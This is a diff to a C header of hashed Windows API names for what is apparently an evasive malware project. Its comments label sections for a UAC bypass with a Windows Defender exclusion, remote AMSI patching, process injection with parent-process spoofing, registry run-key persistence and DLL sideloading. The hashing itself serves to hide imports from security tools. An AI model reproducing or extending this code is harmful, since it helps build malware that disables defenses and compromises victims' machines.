@@ -27,6 +27,11 @@
 // Used only for bootstrap — clean-ntdll section mapping
 #define NtOpenSection_JOAAT             0x6EC52BCD
 
+// ----------- Patchless exit hook (ntdll exports, for InstallExitHookPatchless) -----------
+#define RtlAddVectoredExceptionHandler_JOAAT  0xD27746FE
+#define RtlCaptureContext_JOAAT               0x0FD2D451
+#define NtContinue_JOAAT                      0x2DC23756
+
 // ----------- Exit Hook / Elevation (ntdll exports) -----------
 #define RtlExitUserProcess_JOAAT        0x3DC05538
 #define LdrAddRefDll_JOAAT              0x807ED758
@@ -60,34 +65,28 @@
 #define FindClose_JOAAT                 0x1FF88458
 #define GetCommandLineA_JOAAT           0x14D7236E  // persistence-launch guard in Sideload.c
 
-// ----------- UacBypass.c — AppInfo RPC WD exclusion (kernel32) -----------
-#define CreateEventW_JOAAT              0xC56DE59D
-#define WaitForSingleObject_JOAAT       0x000DEA0A
-#define WaitForDebugEvent_JOAAT         0x529F4D40
-#define ContinueDebugEvent_JOAAT        0x64D063F8
-#define DebugActiveProcessStop_JOAAT    0xA238C74D
-#define TerminateProcess_JOAAT          0x66AFA02A
-#define GetSystemDirectoryW_JOAAT       0xD3A9E702
-#define GetWindowsDirectoryW_JOAAT      0xB8923C5F
+// ----------- Install.c / Persist.c (kernel32) -----------
 #define GetModuleFileNameW_JOAAT        0x6EEA1E33
 #define CreateProcessW_JOAAT            0xD460721B
-#define InitializeProcThreadAttributeList_JOAAT  0x8F01862A
-#define UpdateProcThreadAttribute_JOAAT          0x0C6CB2A1
-#define DeleteProcThreadAttributeList_JOAAT      0x30A136E9
-
-// ----------- UacBypass.c — AppInfo RPC WD exclusion (ntdll) -----------
-#define NtQueryInformationProcess_JOAAT 0xE873107E
-#define NtRemoveProcessDebug_JOAAT      0x38CC29DE
-#define NtDuplicateObject_JOAAT         0x86426FE8
-#define DbgUiSetThreadDebugObject_JOAAT 0xCF6EB6F6
 
 // ----------- Persist.c — Registry run-key persistence (advapi32) -----------
 #define RegOpenKeyExW_JOAAT             0x769D1396
 #define RegSetValueExW_JOAAT            0x941AFF2B
 #define RegCloseKey_JOAAT               0xFADC2D7D
 
-// ----------- Inject.c — Remote process injection (BUILD_DLL persistence path) -----------
-#define NtOpenProcess_JOAAT             0x61CF38BC
-#define NtWriteVirtualMemory_JOAAT      0x7A65C193
-#define NtCreateThreadEx_JOAAT          0xE5F15DAA
-#define NtQuerySystemInformation_JOAAT  0x62A8E2DE
+// ----------- Remote AMSI pre-patch (kernel32) -----------
+#define WriteProcessMemory_JOAAT        0x184EC554
+#define AmsiScanBuffer_JOAAT            0x725879AF
+
+// ----------- Inject.c — Remote process injection + PPID spoof -----------
+#define NtCreateThreadEx_JOAAT                  0xE5F15DAA
+#define NtUnmapViewOfSection_JOAAT              0x0A6A385C
+#define CreateToolhelp32Snapshot_JOAAT          0x58345E52
+#define Process32FirstW_JOAAT                   0xF4249A03
+#define Process32NextW_JOAAT                    0xFF8486DE
+#define OpenProcess_JOAAT                       0xA650376B
+#define InitializeProcThreadAttributeList_JOAAT 0x8F01862A
+#define UpdateProcThreadAttribute_JOAAT         0x0C6CB2A1
+#define DeleteProcThreadAttributeList_JOAAT     0x30A136E9
+#define ResumeThread_JOAAT                      0xDF485CF4
+
